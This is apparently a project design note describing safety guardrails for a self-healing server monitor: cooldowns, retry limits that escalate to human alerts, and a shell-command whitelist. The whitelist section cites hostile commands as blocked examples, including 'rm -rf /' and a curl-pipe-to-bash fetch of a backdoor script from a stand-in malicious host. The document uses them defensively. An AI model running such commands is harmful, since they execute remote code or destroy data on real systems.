# Phase 3: Safety Guardrails (CRITICAL)

## Overview

**This is what separates good automation from dangerous automation.**

Production-grade systems enforce safety mechanisms to prevent cascading failures. Phase 3 implements 3 critical guardrails that make self-healing safe for real-world deployment.

---

## The 3 Guardrails

### 1️⃣ **Cooldown Protection** (MANDATORY)

**Problem:** Without cooldowns, healing actions can trigger every monitoring cycle, creating infinite loops.

**Solution:** Enforce cooldown periods between healing attempts.

```javascript
// Track last healing time
const lastHealingActions = {
  cpu: 0,
  memory: 0,
  disk: 0,
};

// Check cooldown before healing
function canHeal(resourceType, now) {
  const timeSinceLastAction = now - lastHealingActions[resourceType];
  const cooldownMs = policy.cooldown * 1000;
  return timeSinceLastAction >= cooldownMs;
}
```

**Configuration (`policies.json`):**
```json
{
  "resources": {
    "cpu": { "cooldown": 300 },      // 5 minutes
    "memory": { "cooldown": 300 },   // 5 minutes
    "disk": { "cooldown": 600 }      // 10 minutes (more conservative)
  }
}
```

**Example:**
- CPU hits 90% at 10:00:00 → Healing triggered
- CPU hits 90% at 10:02:00 → **Blocked** (cooldown not expired)
- CPU hits 90% at 10:05:01 → Healing allowed (>5 minutes passed)

---

### 2️⃣ **Max Retry Count**

**Problem:** If underlying issue persists, healing attempts repeat forever, wasting resources and potentially causing outages.

**Solution:** Stop auto-healing after N failed attempts and raise HIGH alert for human intervention.

```javascript
// Phase 3: Retry tracking
const retryCounters = {
  cpu: { count: 0, lastResetTime: Date.now() },
  memory: { count: 0, lastResetTime: Date.now() },
  disk: { count: 0, lastResetTime: Date.now() },
  services: {} // Per-service tracking
};

function canRetry(resourceOrService, isService) {
  const counter = retryCounters[resourceOrService];
  
  // Reset after 1 hour
  if (now - counter.lastResetTime > 3600000) {
    counter.count = 0;
    counter.lastResetTime = now;
  }
  
  return counter.count < maxRetries; // Default: 3
}
```

**Configuration (`policies.json`):**
```json
{
  "guardrails": {
    "maxRetries": 3,           // Stop after 3 attempts
    "retryCooldown": 600,      // Wait 10 minutes between retries
    "retryResetAfter": 3600    // Reset counter after 1 hour
  }
}
```

**Behavior:**
1. **Attempt 1:** CPU healing triggered → Success/Fail (counter = 1)
2. **Attempt 2:** CPU healing triggered → Success/Fail (counter = 2)
3. **Attempt 3:** CPU healing triggered → Success/Fail (counter = 3)
4. **Attempt 4:** ❌ **BLOCKED** → HIGH alert raised:
   ```
   🚨 MAX RETRIES EXCEEDED - AUTO-HEALING STOPPED
   Resource: cpu
   Retry Count: 3/3
   Action: Auto-healing disabled
   Recommendation: Manual intervention required
   ```

**Counter Reset:** After 1 hour of no attempts, counter resets to 0.

---

### 3️⃣ **Command Whitelist**

**Problem:** `runCommand()` can execute ANY shell command → security vulnerability.

**Solution:** Only allow pre-approved commands to run.

```javascript
// Phase 3: Command whitelist
const ALLOWED_COMMANDS = [
  // Service restart
  "bash /path/to/restart-service.sh",
  
  // Resource healing
  "bash /path/to/kill-process.sh",
  "bash /path/to/cleanup-memory.sh",
  "bash /path/to/cleanup-disk.sh",
  
  // Systemctl operations
  "systemctl restart nginx",
  "systemctl restart postgresql",
  
  // Safe cleanup
  "journalctl --vacuum-time=3d",
];

function isCommandAllowed(command) {
  return ALLOWED_COMMANDS.some(allowed => 
    command.replace(/^sudo\s+/, '') === allowed
  );
}

exports.runCommand = (command) => {
  if (!isCommandAllowed(command)) {
    throw new Error(`❌ SECURITY: Command blocked: "${command}"`);
  }
  // Execute...
};
```

**Security Benefits:**
- ❌ **Blocks:** `rm -rf /`, `curl evil.com | bash`, arbitrary scripts
- ✅ **Allows:** Only pre-approved healing scripts and systemctl operations

**Example Blocked Command:**
```javascript
runCommand("curl http://malicious.com/backdoor.sh | bash");
// Output: ❌ SECURITY: Command blocked by whitelist
```

---

## Architecture

### Before Phase 3 (DANGEROUS ⚠️)
```
CPU > 85% → Heal → CPU > 85% → Heal → CPU > 85% → Heal (INFINITE LOOP!)
Service down → Restart → Service down → Restart (FOREVER!)
```

### After Phase 3 (SAFE ✅)
```
CPU > 85% → Heal → [COOLDOWN 5 min] → CPU > 85% → Heal → [COOLDOWN] → ...
          ↓
       Counter++
          ↓
    If counter >= 3:
      Stop healing
      Raise HIGH alert
      Wait for human
```

---

## Files Modified

### Modified Files
1. **`backend/src/services/healing.service.js`**
   - Added retry counters for CPU/Memory/Disk/Services
   - Integrated `canRetry()` checks before all healing actions
   - Increments retry counter on success AND failure
   - Raises HIGH alert when max retries exceeded

2. **`backend/src/utils/shell.js`**
   - Added `ALLOWED_COMMANDS` whitelist
   - Added `isCommandAllowed()` validator
   - `runCommand()` now rejects unauthorized commands

3. **`backend/src/config/policies.json`**
   - Added `guardrails` section with max retries configuration

4. **`backend/src/config/policies.js`**
   - Added `getGuardrails()` function
   - Added guardrails to default policies

---

## Industry Explanation (SRE-Grade)

> "The system enforces **safety guardrails** such as cooldowns, retry limits, and command whitelisting to prevent cascading failures. These mechanisms ensure that automation remains bounded and predictable, even under failure conditions. This approach is standard in production systems like Kubernetes (exponential backoff), AWS Auto Scaling (cooldown periods), and Datadog monitors (alert throttling)."

**Translation:**
- **Cooldowns** = Like rate limiting for automation
- **Retry limits** = Circuit breaker pattern (stop after N failures)
- **Command whitelist** = Principle of least privilege (zero trust security)

---

## Comparison with Other Systems

| System | Cooldowns | Retry Limits | Command Whitelist |
|--------|-----------|--------------|-------------------|
| **Your System** | ✅ Configurable | ✅ Max 3 + HIGH alert | ✅ Pre-approved only |
| Kubernetes HPA | ✅ Stabilization window | ✅ Backoff limits | ✅ RBAC |
| AWS Auto Scaling | ✅ Cooldown periods | ✅ Health check grace | ✅ IAM policies |
| Datadog Monitors | ✅ Alert throttling | ✅ Re-notify limits | ✅ N/A (monitoring) |
| **No Guardrails** | ❌ Infinite loops | ❌ Resource waste | ❌ Security risk |

---

## Testing

### Test 1: Cooldown Protection
```bash
# Trigger CPU healing
stress --cpu 8 --timeout 60s

# Backend logs should show:
# 1. First healing: ✅ CPU MITIGATION SUCCESSFUL
# 2. Second attempt (< 5 min): Blocked by cooldown (no logs)
# 3. Third attempt (> 5 min): ✅ CPU MITIGATION SUCCESSFUL
```

### Test 2: Max Retry Limit
```bash
# Simulate persistent CPU issue (3 attempts)
# Edit policies.json: "maxRetries": 3, "cooldown": 10 (fast testing)

stress --cpu 8 --timeout 10m

# Expected:
# Attempt 1: Healing triggered (counter = 1)
# Attempt 2: Healing triggered (counter = 2)
# Attempt 3: Healing triggered (counter = 3)
# Attempt 4: 🚨 MAX RETRIES EXCEEDED - AUTO-HEALING STOPPED
# HIGH alert raised in dashboard
```

### Test 3: Command Whitelist
```bash
# Try to execute unauthorized command
node -e "
const { runCommand } = require('./backend/src/utils/shell');
runCommand('rm -rf /tmp/test').catch(err => console.log(err.message));
"

# Output: ❌ SECURITY: Command blocked by whitelist: "rm -rf /tmp/test"
```

---

## Configuration

### Example: Conservative Production Settings
```json
{
  "resources": {
    "cpu": {
      "threshold": 95,
      "cooldown": 900,
      "enabled": true
    },
    "memory": {
      "threshold": 90,
      "cooldown": 900,
      "enabled": true
    },
    "disk": {
      "threshold": 95,
      "cooldown": 1800,
      "enabled": true
    }
  },
  "guardrails": {
    "maxRetries": 2,
    "retryCooldown": 1800,
    "retryResetAfter": 7200
  }
}
```

### Example: Aggressive Testing Settings
```json
{
  "resources": {
    "cpu": { "threshold": 50, "cooldown": 10 },
    "memory": { "threshold": 50, "cooldown": 10 },
    "disk": { "threshold": 70, "cooldown": 10 }
  },
  "guardrails": {
    "maxRetries": 3,
    "retryCooldown": 30,
    "retryResetAfter": 300
  }
}
```

---

## Why Companies Care

### Without Guardrails (Student Project)
- ❌ Healing loops crash systems
- ❌ No protection from runaway automation
- ❌ Security vulnerability (arbitrary commands)
- ❌ Wastes resources on repeated failures
- ❌ No graceful degradation

### With Guardrails (Production-Ready)
- ✅ Bounded automation (predictable behavior)
- ✅ Fail-safe mechanisms (circuit breaker)
- ✅ Security-hardened (zero trust)
- ✅ Resource-efficient (stop after N attempts)
- ✅ Graceful degradation (alert humans when needed)

**Interview Impact:**
> "Our system implements safety guardrails including cooldown periods to prevent healing loops, retry limits with circuit-breaker patterns to stop after N failed attempts, and command whitelisting for security. These mechanisms ensure automation remains safe and bounded, even under failure conditions."

This demonstrates:
- **SRE mindset** (think about failure modes)
- **Production experience** (not just "happy path")
- **Security awareness** (command injection prevention)
- **Observability** (HIGH alerts when limits hit)

---

## Rollback

If Phase 3 causes issues:
```bash
git checkout v1.0-poc  # Revert to stable version
```

Or disable specific guardrails:
```json
{
  "guardrails": {
    "maxRetries": 999,  // Effectively disabled
    "retryCooldown": 1,
    "retryResetAfter": 60
  }
}
```

---

## Next Steps

After Phase 3, your system has:
1. ✅ **Phase 1:** Database persistence (30-day history)
2. ✅ **Phase 2:** Configurable policies (hot-reload)
3. ✅ **Phase 3:** Safety guardrails (production-ready)

**Possible Phase 4:**
- Multi-server monitoring (dashboard shows multiple hosts)
- Historical metric trends (24-hour charts)
- Policy versioning (track changes over time)
- Advanced healing strategies (gradual restart, canary deployments)

---

**Phase 3 Complete!** 🛡️  
Your system now has **SRE-grade safety guardrails** to prevent cascading failures.